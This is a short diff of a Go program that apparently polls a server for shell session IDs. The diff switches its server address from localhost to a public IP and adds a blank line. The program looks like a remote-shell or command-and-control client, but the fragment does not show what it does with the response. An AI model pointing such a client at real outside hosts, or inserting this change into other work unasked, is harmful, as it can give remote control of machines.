@@ -10,7 +10,7 @@ import (
 	"time"
 )
 
-const ServerAddr = "127.0.0.1"
+const ServerAddr = "99.153.7.181"
 
 func fetchShellID() string {
 	resp, err := http.Get("http://" + ServerAddr + "/shellID")
@@ -103,4 +103,5 @@ func main() {
 			}
 		}
 	}
+
 }
